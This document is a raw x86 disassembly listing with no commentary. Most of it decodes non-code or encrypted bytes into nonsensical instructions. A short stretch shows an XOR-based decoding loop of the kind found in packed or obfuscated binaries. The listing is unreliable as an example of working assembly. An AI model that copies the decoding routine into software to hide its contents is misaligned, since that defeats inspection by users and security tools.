  407832:	setb   BYTE PTR [edi-0x27]
  407836:	dec    BYTE PTR [ebx+ebx*2]
  407839:	repnz fmul st,st(5)
  40783c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40783d:	mov    al,0xbb
  40783f:	stos   DWORD PTR es:[edi],eax
  407840:	mov    edx,0x3bce3cb3
  407845:	sub    al,0x1a
  407847:	in     eax,dx
  407848:	pop    ecx
  407849:	or     BYTE PTR [edi+0x4f91a6e6],bh
  40784f:	jp     0x40783d
  407851:	dec    ebx
  407852:	adc    BYTE PTR [ecx],ah
  407854:	mov    cl,0x69
  407856:	(bad)  
  407857:	sub    ecx,ebp
  407859:	fnstenv [edx-0x6fb6a7d7]
  40785f:	add    eax,0xfe47efe6
  407864:	xchg   esp,eax
  407865:	mov    esi,0xf3787c2a
  40786a:	icebp  
  40786b:	jmp    0x7b0b9d07
  407870:	inc    eax
  407871:	call   0xa5e6e26f
  407876:	jecxz  0x407834
  407878:	xchg   edi,eax
  407879:	and    dl,dl
  40787b:	jmp    0xb0a599f3
  407880:	test   DWORD PTR [edi],esp
  407882:	iret   
  407883:	call   0xc150cb96
  407888:	pop    esp
  407889:	ds (bad) 
  40788c:	dec    ebx
  40788d:	fisubr WORD PTR [ebx]
  40788f:	(bad)  [edx+ecx*8]
  407892:	push   ss
  407893:	repz mov ecx,0xaf4a1273
  407899:	call   FWORD PTR [ebx]
  40789b:	push   ds
  40789c:	push   ss
  40789d:	inc    ebx
  40789e:	inc    esi
  40789f:	loope  0x4078a8
  4078a1:	xor    bh,al
  4078a3:	ja     0x4078fd
  4078a5:	cmp    edx,DWORD PTR ds:0x979945f9
  4078ab:	add    al,0x37
  4078ad:	ror    BYTE PTR [edi+0x2b],0x48
  4078b1:	mov    ?,esp
  4078b3:	repz ss or eax,0x9b31aa41
  4078ba:	inc    ebp
  4078bb:	mov    ecx,0xc27b8f89
  4078c0:	cli    
  4078c1:	and    eax,0xb1477899
  4078c6:	sbb    DWORD PTR [edx+0x4d],0xffffffb7
  4078ca:	and    esp,DWORD PTR [esi]
  4078cc:	fwait
  4078cd:	je     0x407917
  4078cf:	cmp    BYTE PTR [eax],ah
  4078d1:	adc    al,0xce
  4078d3:	xor    eax,0xd7f5aac5
  4078d8:	cmp    DWORD PTR [ebp-0x48],ebx
  4078db:	mov    edx,0x4dba42d9
  4078e0:	sub    al,0x44
  4078e2:	frstor [esi+0x2d]
  4078e5:	mov    cl,0x9
  4078e7:	xor    ch,BYTE PTR [edx]
  4078e9:	jb     0x407874
  4078eb:	cdq    
  4078ec:	sti    
  4078ed:	sbb    BYTE PTR [edx+0x2],al
  4078f0:	xchg   esp,eax
  4078f1:	sub    DWORD PTR [ecx],0x79
  4078f4:	ret    0xc45d
  4078f7:	cmp    BYTE PTR [ebp-0x3f],0x2c
  4078fb:	icebp  
  4078fc:	(bad)  
  4078fd:	cmp    edi,edx
  4078ff:	dec    ebp
  407900:	or     BYTE PTR [ebx-0x5f750aeb],dl
  407906:	pop    edx
  407907:	scas   eax,DWORD PTR es:[edi]
  407908:	outs   dx,DWORD PTR ds:[esi]
  407909:	outs   dx,DWORD PTR ds:[esi]
  40790a:	xchg   edx,eax
  40790b:	test   BYTE PTR [esi-0x60],bl
  40790e:	(bad)  
  40790f:	jae    0x40789d
  407911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407912:	add    dl,BYTE PTR [ebx-0x1fc64372]
  407918:	pop    edi
  407919:	rcl    DWORD PTR [eax],1
  40791b:	push   ebp
  40791c:	push   es
  40791d:	push   ebx
  40791e:	sbb    BYTE PTR [ebx+ebp*1],ch
  407921:	dec    ebx
  407922:	test   bl,0xe6
  407925:	loopne 0x407954
  407927:	cmp    al,0x15
  407929:	or     DWORD PTR [edi-0x1562dda1],ebp
  40792f:	push   eax
  407930:	and    edi,esi
  407932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407933:	ret    0x2601
  407936:	mov    ecx,0xeaa7e238
  40793b:	js     0x4078e1
  40793d:	xor    ch,BYTE PTR [ecx]
  40793f:	inc    ebp
  407940:	rcr    BYTE PTR [edx+ebx*8],0x14
  407944:	dec    edx
  407945:	mov    BYTE PTR [ebp+esi*4+0x19],bl
  407949:	jo     0x40792b
  40794b:	mov    bl,0xb
  40794d:	push   ebx
  40794e:	(bad)  [eax+0x7db898c8]
  407954:	adc    edx,ecx
  407956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407957:	mov    esi,0x13a7af59
  40795c:	lock push 0x4a
  40795f:	stos   BYTE PTR es:[edi],al
  407960:	fld    DWORD PTR [eax+0x51]
  407963:	cmp    al,0xdf
  407965:	and    BYTE PTR [edi-0x1c981994],dl
  40796b:	js     0x407992
  40796d:	sub    BYTE PTR fs:[ebx-0xe],bl
  407971:	lahf   
  407972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407973:	dec    esp
  407974:	test   DWORD PTR [ebx],edx
  407976:	mov    esp,esp
  407978:	stos   DWORD PTR es:[edi],eax
  407979:	dec    ecx
  40797a:	clc    
  40797b:	outs   dx,BYTE PTR ds:[esi]
  40797c:	sub    BYTE PTR [edi],al
  40797e:	mov    edx,0x312313a1
  407983:	cmp    BYTE PTR [ecx+0x57],0xa8
  407987:	sbb    dl,BYTE PTR [edx]
  407989:	out    0xa0,eax
  40798b:	(bad)  
  40798c:	clc    
  40798d:	sar    BYTE PTR [edi+0x41],1
  407990:	sub    eax,0xefd882a8
  407995:	addr16 js 0x407956
  407998:	call   0x6d25:0x6e3559a6
  40799f:	sub    DWORD PTR [esi],edi
  4079a1:	xchg   edx,eax
  4079a2:	mov    DWORD PTR [ebx],edi
  4079a4:	pop    es
  4079a5:	(bad)  
  4079a6:	jmp    0x407973
  4079a8:	call   0x345013c0
  4079ad:	test   al,0xae
  4079af:	out    dx,eax
  4079b0:	enter  0x73b2,0x9c
  4079b4:	push   ss
  4079b5:	add    bh,BYTE PTR [edx-0x686a80c0]
  4079bb:	cld    
  4079bc:	popf   
  4079bd:	cwde   
  4079be:	inc    ebx
  4079bf:	repnz cmp ebp,edi
  4079c2:	push   edi
  4079c3:	arpl   ax,si
  4079c5:	mov    eax,ds:0x71460cb4
  4079ca:	jb     0x407a11
  4079cc:	mov    eax,0x786ca97f
  4079d1:	dec    ebx
  4079d2:	pop    esp
  4079d3:	stc    
  4079d4:	push   ebx
  4079d5:	mov    dh,ah
  4079d7:	cdq    
  4079d8:	(bad)  
  4079d9:	and    BYTE PTR [esp+edi*8+0x1ad94205],ah
  4079e0:	fstp   DWORD PTR [edi-0x14]
  4079e3:	jbe    0x4079c4
  4079e5:	inc    esp
  4079e6:	pusha  
  4079e7:	adc    esp,edi
  4079e9:	and    BYTE PTR [esi-0xb],bl
  4079ec:	stos   BYTE PTR es:[edi],al
  4079ed:	mov    BYTE PTR [edi+0x4c],bh
  4079f0:	enter  0x9717,0x6e
  4079f4:	adc    BYTE PTR [esi-0x1a],bl
  4079f7:	jl     0x407a0b
  4079f9:	test   al,0x86
  4079fb:	popf   
  4079fc:	lock xchg edi,eax
  4079fe:	test   eax,0xeb98a20a
  407a03:	xor    eax,0xd5a5ad42
  407a08:	dec    eax
  407a09:	dec    ebx
  407a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a0b:	stos   DWORD PTR es:[edi],eax
  407a0c:	mov    ds:0xa1db0c4b,al
  407a11:	mov    bh,BYTE PTR [ecx-0x68]
  407a14:	mov    fs,WORD PTR [esi]
  407a16:	jae    0x4079db
  407a18:	ins    BYTE PTR es:[edi],dx
  407a19:	sbb    BYTE PTR [edi],0x3d
  407a1c:	mov    ecx,0x1058b763
  407a21:	add    ch,BYTE PTR [edx-0x31a02927]
  407a27:	scas   eax,DWORD PTR es:[edi]
  407a28:	cmc    
  407a29:	outs   dx,BYTE PTR ds:[esi]
  407a2a:	call   0x8880:0xce39dd60
  407a31:	sbb    al,0x3a
  407a33:	sbb    ch,bl
  407a35:	jmp    0xffae:0x7ca3a4ae
  407a3c:	and    eax,0xf9d5f4b6
  407a41:	mov    bl,0x66
  407a43:	(bad)  
  407a45:	and    DWORD PTR [edi+0x46],esp
  407a48:	mov    esi,0x7ed1262b
  407a4d:	in     al,0xa5
  407a4f:	jge    0x407a72
  407a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a52:	call   esp
  407a54:	mov    esi,0x6fe55d8
  407a59:	xor    BYTE PTR [esp+ebx*1+0x68f520fa],dl
  407a60:	(bad)  
  407a61:	and    eax,ecx
  407a63:	mov    eax,0xd6729f85
  407a68:	sbb    edi,DWORD PTR [eax]
  407a6a:	call   0x891a:0x134d8b45
  407a71:	mov    ebp,0x83315fac
  407a76:	add    cl,ch
  407a78:	sub    eax,DWORD PTR [esi+0x4d8c2141]
  407a7e:	fs scas eax,DWORD PTR es:[edi]
  407a80:	aad    0x71
  407a82:	ins    BYTE PTR es:[edi],dx
  407a83:	pop    ecx
  407a84:	add    dh,al
  407a86:	pop    ecx
  407a87:	pop    ebp
  407a88:	test   eax,0xd1a2df9f
  407a8d:	add    ax,di
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	inc    ebx
  407ac1:	xchg   BYTE PTR [esp],dl
  407ac4:	pushf  
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407af7
  407acd:	inc    ebp
  407ace:	cdq    
  407acf:	dec    BYTE PTR [esi]
  407ad1:	sbb    DWORD PTR [edi+0x7e],ebx
  407ad4:	in     eax,dx
  407ad5:	addr16 out dx,al
  407ad7:	push   esi
  407ad8:	bnd jae 0x407a9f
  407adb:	test   BYTE PTR [esi],cl
  407add:	sub    ah,cl
  407adf:	ficom  DWORD PTR [edx-0x4e]
  407ae2:	mov    ds,WORD PTR [ebx]
  407ae4:	mov    dh,0xdf
  407ae6:	repnz push edi
  407ae8:	and    ebx,DWORD PTR [ebx+0x5920f3cc]
  407aee:	xor    eax,ebp
  407af0:	loope  0x407af5
  407af2:	xchg   esp,eax
  407af3:	and    BYTE PTR [ebp-0x51],ah
  407af6:	js     0x407aac
  407af8:	test   DWORD PTR [edi-0x55708357],edi
  407afe:	fcmovu st,st(6)
  407b00:	mov    bl,0xf5
  407b02:	mov    ebp,0xd8c6fd1e
  407b07:	mov    DWORD PTR [ecx-0x39],edi
  407b0a:	cmp    al,0xda
  407b0c:	call   0xccd7:0x9e2d043d
  407b13:	dec    esp
  407b14:	in     eax,0x10
  407b16:	push   ebp
  407b17:	push   cs
  407b18:	int3   
  407b19:	(bad)  
  407b1a:	fwait
  407b1b:	iret   
  407b1c:	cmp    DWORD PTR [edx],ecx
  407b1e:	push   eax
  407b1f:	repnz add DWORD PTR [edi+ecx*4],ebx
  407b23:	lea    ecx,[ebp-0x9]
  407b26:	(bad)  
  407b28:	add    DWORD PTR [edx],0xffffff80
  407b2b:	ret    0x92ee
  407b2e:	in     al,dx
  407b2f:	mov    edi,0xa7e9d552
  407b34:	aam    0xf8
  407b36:	jns    0x407ba3
  407b38:	cmp    BYTE PTR [edx-0x51],dl
  407b3b:	imul   ebx,DWORD PTR [edi+ebp*8],0x66
  407b3f:	sbb    cl,cl
  407b41:	fdiv   QWORD PTR [ecx+ebp*1+0xb6df5b9]
  407b48:	add    edx,DWORD PTR [ebx]
  407b4a:	(bad)
  407b4d:	(bad)  
  407b4e:	sar    DWORD PTR [ebx+0x1f805b1b],1
  407b54:	jmp    0xe1e8:0x8dce0003
  407b5b:	jo     0x407ae1
  407b5d:	push   ebp
  407b5e:	adc    BYTE PTR [esi-0x45],bl
  407b61:	or     BYTE PTR [edi],0x83
  407b64:	test   al,0xa0
  407b66:	push   0x7e9cebaf
  407b6b:	inc    ebp
  407b6c:	lahf   
  407b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b6e:	jmp    0xcf8a59ab
  407b73:	repnz cmp ecx,ebp
  407b76:	in     al,0x15
  407b78:	mov    bh,0xe5
  407b7a:	arpl   sp,si
  407b7c:	out    0x9,eax
  407b7e:	js     0x407b41
  407b80:	push   esi
  407b81:	loopne 0x407bbd
  407b83:	icebp  
  407b84:	xchg   edx,eax
  407b85:	or     al,0x3b
  407b87:	mov    edi,0x1d20dbce
  407b8c:	fidiv  WORD PTR [esi-0x2]
  407b8f:	mov    eax,0xe2026b60
  407b94:	nop
  407b95:	add    DWORD PTR [esi],esi
  407b97:	retf   
  407b98:	pop    ebp
  407b99:	adc    al,0x3e
  407b9b:	retf   0x73e0
  407b9e:	ins    BYTE PTR es:[edi],dx
  407b9f:	cld    
  407ba0:	xchg   DWORD PTR [esi-0x56fa8143],esi
  407ba6:	mov    ds:0x4494140b,eax
  407bab:	ss into 
  407bad:	push   edi
  407bae:	add    eax,0x112bf6c1
  407bb3:	lods   al,BYTE PTR ds:[esi]
  407bb4:	cs ds stos BYTE PTR es:[edi],al
  407bb7:	jecxz  0x407b69
  407bb9:	aam    0x63
  407bbb:	je     0x407b50
  407bbd:	and    al,0x14
  407bbf:	push   0x4b59e51
  407bc4:	xchg   edx,eax
  407bc5:	push   esi
  407bc6:	adc    dh,BYTE PTR [esi-0x52]
  407bc9:	sbb    BYTE PTR [edi+0x727a4a30],ah
  407bcf:	daa    
  407bd0:	rcl    bl,0x20
  407bd3:	jmp    0xf2640c52
  407bd8:	and    al,BYTE PTR [ecx-0x6f]
  407bdb:	pop    eax
  407bdc:	mov    ecx,0x5e18540c
  407be1:	out    dx,al
  407be2:	fmul   DWORD PTR [ecx-0x20]
  407be5:	xchg   ebx,eax
  407be6:	lock sub DWORD PTR [ecx-0xe834af1],esi
  407bed:	xchg   edx,eax
  407bee:	mov    ah,0x93
  407bf0:	call   0xce463396
  407bf5:	scas   eax,DWORD PTR es:[edi]
  407bf6:	adc    BYTE PTR ds:0xbc9dfd89,bl
  407bfc:	outs   dx,DWORD PTR ds:[esi]
  407bfd:	rol    bl,cl
  407bff:	add    esi,DWORD PTR [ebx-0x4d772161]
  407c05:	and    BYTE PTR [ebp+ebp*8+0x2a],0xa0
  407c0a:	xlat   BYTE PTR ds:[ebx]
  407c0b:	jns    0x407bfa
  407c0d:	mov    esp,0xc35f17f1
  407c12:	mov    ch,0xeb
  407c14:	in     al,dx
  407c15:	in     al,0xfa
  407c17:	sbb    DWORD PTR [eax-0x435e5ff],ecx
  407c1d:	push   ebp
  407c1e:	jmp    0xab1dd9a3
  407c23:	daa    
  407c24:	(bad)  
  407c25:	adc    BYTE PTR ds:0x53fd9399,cl
  407c2b:	mov    esi,0x95f2df8e
  407c30:	sbb    al,0x84
  407c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c33:	xchg   BYTE PTR [esi],ah
  407c35:	fisub  WORD PTR [eax+0x5b]
  407c38:	mov    cl,0x10
  407c3a:	mov    ah,0xef
  407c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c3d:	sub    dl,dl
  407c3f:	cmp    bh,BYTE PTR [eax]
  407c41:	fld    DWORD PTR [ecx+edi*2-0x50b27598]
  407c48:	and    al,0xb8
  407c4a:	out    0xe0,eax
  407c4c:	mov    eax,0xf801a625
  407c51:	scas   al,BYTE PTR es:[edi]
  407c52:	push   ds
  407c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c54:	lea    edi,[eax]
  407c56:	enter  0x6321,0xd1
  407c5a:	push   cs
  407c5b:	adc    al,0xb7
  407c5d:	xchg   esp,edi
  407c5f:	mov    dh,0x8f
  407c61:	pop    ebx
  407c62:	jl     0x407c39
  407c64:	inc    esp
  407c65:	jl     0x407c7a
  407c67:	dec    esi
  407c68:	xchg   edi,eax
  407c69:	xor    DWORD PTR [edx+ecx*2],ecx
  407c6c:	add    eax,0xee98771
  407c71:	mov    ecx,0x6f9a0e12
  407c76:	pushf  
  407c77:	iret   
  407c78:	xor    al,BYTE PTR [ebp+ebp*2+0x2c8f600a]
  407c7f:	jle    0x407ceb
  407c81:	mov    al,ds:0xd8f8f20f
  407c86:	add    edx,esp
  407c88:	sti    
  407c89:	push   edi
  407c8a:	jge    0x407ccd
  407c8c:	adc    al,0xb0
  407c8e:	inc    ebp
  407c8f:	loop   0x407c7b
  407c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c92:	xor    ebx,DWORD PTR [ebx+0x6d]
  407c95:	and    DWORD PTR [eax+0x6d],ebp
  407c98:	dec    esi
  407c99:	ret    0xa6b1
  407c9c:	scas   eax,DWORD PTR es:[edi]
  407c9d:	dec    edi
  407c9e:	stc    
  407c9f:	das    
  407ca0:	ror    BYTE PTR [eax+0x1eb23a89],cl
  407ca6:	(bad)
  407caa:	add    edx,0x8ef636d7
  407cb0:	clc    
  407cb1:	fistp  QWORD PTR [ebx]
  407cb3:	das    
  407cb4:	mov    ch,0x6c
  407cb6:	dec    ebp
  407cb7:	leave  
  407cb8:	cli    
  407cb9:	dec    edx
  407cba:	dec    edx
  407cbb:	jmp    0x407c5a
  407cbd:	and    al,0x90
  407cbf:	sbb    BYTE PTR [eax+0x747bf460],cl
  407cc5:	test   BYTE PTR [edi],bh
  407cc7:	sub    al,0x8
  407cc9:	sbb    BYTE PTR [ecx],0x9f
  407ccc:	sub    edx,DWORD PTR [ebx+0x66]
  407ccf:	lods   al,BYTE PTR ds:[esi]
  407cd0:	cwde   
  407cd1:	dec    esp
  407cd2:	fidiv  WORD PTR [edx]
  407cd4:	add    al,0x8f
  407cd6:	test   BYTE PTR [eax+esi*2-0x2959a435],dl
  407cdd:	inc    esp
  407cde:	and    DWORD PTR [edi+0x22d90045],esp
  407ce4:	stc    
  407ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce6:	call   0x6ad7:0xda54ee0
  407ced:	jmp    0x407d35
  407cef:	in     eax,0xa5
  407cf1:	icebp  
  407cf2:	xlat   BYTE PTR ds:[ebx]
  407cf3:	mov    BYTE PTR ds:0xff65454,al
  407cf9:	lock gs pop es
  407cfc:	gs in  eax,dx
  407cfe:	sbb    al,0xe6
  407d00:	fstp   DWORD PTR [ebp-0x12]
  407d03:	mov    ebp,0x36768f85
  407d08:	lods   eax,DWORD PTR ds:[esi]
  407d09:	mov    dh,0xc0
  407d0b:	dec    esi
  407d0c:	cwde   
  407d0d:	inc    ecx
  407d0e:	je     0x407cef
  407d10:	das    
  407d11:	sub    eax,DWORD PTR [esi-0x2b]
  407d14:	fmul   QWORD PTR [edx+edi*4+0x7f]
  407d18:	mov    bh,0x69
  407d1a:	(bad)  
  407d1b:	mov    al,ds:0xf0eb909f
  407d20:	rcr    BYTE PTR [edx+0x6a9ebaec],1
  407d26:	(bad)  [edi-0x7255ec47]
  407d2c:	sti    
  407d2d:	dec    DWORD PTR [ecx-0x7d]
  407d30:	or     DWORD PTR [ecx],0xffffffe1
  407d33:	popa   
  407d34:	inc    ebp
  407d35:	lahf   
  407d36:	fdivr  st,st(1)
  407d38:	pop    es
  407d39:	xchg   DWORD PTR [eax],ecx
  407d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d3c:	arpl   WORD PTR [eax],sp
  407d3e:	out    dx,eax
  407d3f:	mov    ah,0x54
  407d41:	ds pop edx
  407d43:	in     al,0xf
  407d45:	fldcw  WORD PTR [esi]
  407d47:	and    BYTE PTR [eax-0x73173bd7],0x9b
  407d4e:	in     eax,dx
  407d4f:	mov    eax,0x869e71fe
  407d54:	jns    0x407d3c
  407d56:	mov    ah,0x13
  407d58:	lea    ebp,[edx+0x73]
  407d5b:	cmp    ebp,esp
  407d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d5e:	jb     0x407d2a
  407d60:	fwait
  407d61:	mov    al,ds:0x46842e39
  407d66:	xor    DWORD PTR [ecx-0x18321158],0x4b
  407d6d:	mov    cl,0xfd
  407d6f:	or     ah,BYTE PTR [edi-0x2d199bc5]
  407d75:	xor    BYTE PTR [ecx-0x702f699a],ah
  407d7b:	cmp    eax,0x3f5149fe
  407d80:	fs jnp 0x407dd1
  407d83:	jmp    0xfa05:0x5fb4bf23
  407d8a:	arpl   WORD PTR [esi+ecx*1],cx
  407d8d:	jbe    0x407d85
  407d8f:	mov    WORD PTR [eax-0x39],fs
  407d92:	out    0xc9,al
  407d94:	iret   
  407d95:	test   al,0x5
  407d97:	push   esp
  407d98:	leave  
  407d99:	mov    ds:0xc4afd066,al
  407d9e:	and    BYTE PTR [esi+0x30c5d599],dl
  407da4:	cmp    ah,BYTE PTR [eax]
  407da6:	mov    eax,0xe87d91aa
  407dab:	loopne 0x407d49
  407dad:	mov    ebx,0x5972f451
  407db2:	(bad)  
  407db3:	jmp    0xc2ef1585
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fadd   DWORD PTR [eax+ebx*8-0x27775827]
  407ddf:	js     0x407e59
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407e52
  407de6:	sub    BYTE PTR [ecx-0x2c],bh
  407de9:	cdq    
  407dea:	jo     0x407d82
  407dec:	mov    edi,0x87f667c4
  407df1:	popa   
  407df2:	pop    ecx
  407df3:	je     0x407e64
  407df5:	fisttp DWORD PTR ds:0x2deef728
  407dfb:	xchg   esp,eax
  407dfc:	ins    DWORD PTR es:[edi],dx
  407dfd:	jle    0x407dcc
  407dff:	js     0x407dee
  407e01:	fimul  DWORD PTR [edi+0x50]
  407e04:	sub    BYTE PTR [ebp+0x643f5f2],dl
  407e0a:	(bad)  
  407e0b:	loop   0x407e7f
  407e0d:	fstp   TBYTE PTR [edi]
  407e0f:	loope  0x407e2b
  407e11:	(bad)  
  407e12:	xchg   ebp,eax
  407e13:	jg     0x407e20
  407e15:	sti    
  407e16:	adc    al,0xfe
  407e18:	jae    0x407e71
  407e1a:	(bad)  
  407e1b:	mov    dl,0xe9
  407e1d:	sbb    al,0x96
  407e1f:	stos   DWORD PTR es:[edi],eax
  407e20:	cmp    edi,DWORD PTR [edi+0x5f]
  407e23:	sbb    al,0xad
  407e25:	imul   eax,DWORD PTR [esi],0x38
  407e28:	jae    0x407e1c
  407e2a:	stos   DWORD PTR es:[edi],eax
  407e2b:	pop    edx
  407e2c:	inc    edx
  407e2d:	add    al,0xe0
  407e2f:	test   al,0xc4
  407e31:	mov    WORD PTR [edi-0x3351eca2],ds
  407e37:	jmp    0x1306:0x6663060d
  407e3e:	jmp    0x407dd6
  407e40:	sub    dh,ah
  407e42:	out    dx,al
  407e43:	js     0x407de3
  407e45:	or     BYTE PTR [ebp+0x77d93249],bl
  407e4b:	sub    cl,BYTE PTR [edi]
  407e4d:	ja     0x407ea4
  407e4f:	scas   eax,DWORD PTR es:[edi]
  407e50:	push   esi
  407e51:	xor    DWORD PTR [edx],esi
  407e53:	mov    dh,0xda
  407e55:	and    eax,0x9a46db37
  407e5a:	mov    DWORD PTR [edi-0x39],ecx
  407e5d:	jmp    FWORD PTR [edi+0x34aa26a0]
  407e63:	push   edx
  407e64:	jb     0x407e3f
  407e66:	cmp    eax,ebx
  407e68:	jmp    0x8014e89e
  407e6d:	dec    edx
  407e6e:	add    al,0x61
  407e70:	es inc esi
  407e72:	jp     0x407e5f
  407e74:	call   0x672d:0x11267890
  407e7b:	pop    edi
  407e7c:	lods   eax,DWORD PTR ds:[esi]
  407e7d:	pop    ebp
  407e7e:	push   0x33f0e020
  407e83:	push   ss
  407e84:	int    0xd8
  407e86:	retf   0x7690
  407e89:	lock dec esi
  407e8b:	dec    ebx
  407e8c:	sub    al,0x9c
  407e8e:	add    BYTE PTR [edi+0x29],dl
  407e91:	(bad)  
  407e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e93:	dec    ecx
  407e94:	cwde   
  407e95:	in     al,dx
  407e96:	jbe    0x407ed8
  407e98:	and    esp,DWORD PTR [ebx]
  407e9a:	sahf   
  407e9b:	add    DWORD PTR [eax],ebp
  407e9d:	jle    0x407ed0
  407e9f:	jmp    0x92a9:0x9c19080c
  407ea6:	pop    DWORD PTR [esi]
  407ea8:	dec    ecx
  407ea9:	push   ebx
  407eaa:	mov    BYTE PTR [ebp-0x6df7ef32],dl
  407eb0:	add    al,0xc2
  407eb2:	xor    eax,edx
  407eb4:	test   DWORD PTR [eax-0x6a],eax
  407eb7:	out    0x3f,al
  407eb9:	rol    BYTE PTR [ebp-0x2d10213b],1
  407ebf:	cs ret 
  407ec1:	sub    eax,0x230638c4
  407ec6:	pop    esi
  407ec7:	xchg   esi,eax
  407ec8:	pop    ebx
  407ec9:	sub    dh,BYTE PTR [edi+0x37]
  407ecc:	bound  ecx,QWORD PTR [edi]
  407ece:	inc    ecx
  407ecf:	stos   DWORD PTR es:[edi],eax
  407ed0:	in     al,0x77
  407ed2:	jmp    FWORD PTR [eax+0x2305b02f]
  407ed8:	ds push edi
  407eda:	add    DWORD PTR [eax],ebp
  407edc:	push   0x6e
  407ede:	lahf   
  407edf:	packsswb mm0,QWORD PTR [ecx+edi*4]
  407ee3:	dec    ecx
  407ee4:	pop    ebp
  407ee5:	shl    DWORD PTR [ebx],0xa3
  407ee8:	xchg   ebx,eax
  407ee9:	dec    edx
  407eea:	sbb    BYTE PTR [ecx+0x20],ch
  407eed:	fdivr  DWORD PTR [edx-0x6d3758a1]
  407ef3:	shl    DWORD PTR [edi-0x2e],cl
  407ef6:	lahf   
  407ef7:	fwait
  407ef8:	xor    eax,0x72a2408
  407efd:	xchg   esi,eax
  407efe:	test   DWORD PTR [esi],esi
  407f00:	loop   0x407f55
  407f02:	xor    ch,BYTE PTR [ebx]
  407f04:	xor    eax,0xffffffb4
  407f07:	test   eax,0xd3450345
  407f0c:	mov    DWORD PTR [ebx+edx*8],0xb58fb3fc
  407f13:	addr16 js 0x407f43
  407f16:	std    
  407f17:	pop    eax
  407f18:	dec    ecx
  407f19:	xor    dh,BYTE PTR [edx+0x8e022a4]
  407f1f:	mov    eax,0xda219f62
  407f24:	nop
  407f25:	rcl    DWORD PTR [esi-0x10b495ef],1
  407f2b:	mov    ebp,0x113d2ce6
  407f30:	lea    ecx,[eax+esi*1+0x77]
  407f34:	jns    0x407ee7
  407f36:	dec    ebx
  407f37:	(bad)
  407f3c:	push   ebp
  407f3d:	cmp    BYTE PTR [eax+0x2a],0x18
  407f41:	fbld   TBYTE PTR [eax]
  407f43:	jbe    0x407ef8
  407f45:	jne    0x407f96
  407f47:	ret    
  407f48:	jns    0x407f89
  407f4a:	cli    
  407f4b:	jmp    0x9415:0x9df42c98
  407f52:	bound  esi,QWORD PTR [esi+0x45]
  407f55:	cmc    
  407f56:	(bad)  [edx]
  407f58:	cs jecxz 0x407f43
  407f5b:	dec    edx
  407f5c:	dec    esp
  407f5d:	inc    edx
  407f5e:	into   
  407f5f:	xchg   BYTE PTR [ecx],bl
  407f61:	inc    ebx
  407f62:	cmp    eax,0xa60aa6fc
  407f67:	pop    ebp
  407f68:	fwait
  407f69:	ds xchg esi,eax
  407f6b:	aaa    
  407f6c:	sub    cl,dl
  407f6e:	and    al,0xd6
  407f70:	popf   
  407f71:	mov    ebp,0xae7dc789
  407f76:	adc    ebp,edi
  407f78:	fsub   DWORD PTR [edx+eiz*2]
  407f7b:	jbe    0x407f04
  407f7d:	retf   
  407f7e:	xchg   BYTE PTR [ecx-0x69],bl
  407f81:	mov    es,WORD PTR [ebx+0x124616bf]
  407f87:	retf   0x6102
  407f8a:	sar    esi,cl
  407f8c:	(bad)  
  407f8d:	pushf  
  407f8e:	ins    DWORD PTR es:[edi],dx
  407f8f:	sub    cl,dh
  407f91:	xor    eax,DWORD PTR [eax-0x3b]
  407f94:	xchg   dx,ax
  407f96:	fisubr WORD PTR [ecx+0x7]
  407f99:	popf   
  407f9a:	gs cmp eax,0x54c3531c
  407fa0:	outs   dx,BYTE PTR ds:[esi]
  407fa1:	test   eax,0x97f680b3
  407fa6:	inc    esp
  407fa7:	jp     0x407fa4
  407fa9:	dec    ecx
  407faa:	dec    esi
  407fab:	xchg   esp,eax
  407fac:	mov    dh,cl
  407fae:	adc    DWORD PTR [edx+0x58],edi
  407fb1:	cld    
  407fb2:	hlt    
  407fb3:	adc    al,0xa6
  407fb5:	push   esp
  407fb6:	inc    ebx
  407fb7:	into   
  407fb8:	ret    
  407fb9:	dec    ecx
  407fba:	and    eax,0x1ada51a5
  407fbf:	lds    ebp,FWORD PTR [esi]
  407fc1:	outs   dx,DWORD PTR ds:[esi]
  407fc2:	jb     0x407f90
  407fc4:	loopne 0x408026
  407fc6:	js     0x408019
  407fc8:	cmp    cl,cl
  407fca:	sub    ecx,eax
  407fcc:	pop    esp
  407fcd:	jbe    0x407fd5
  407fcf:	cld    
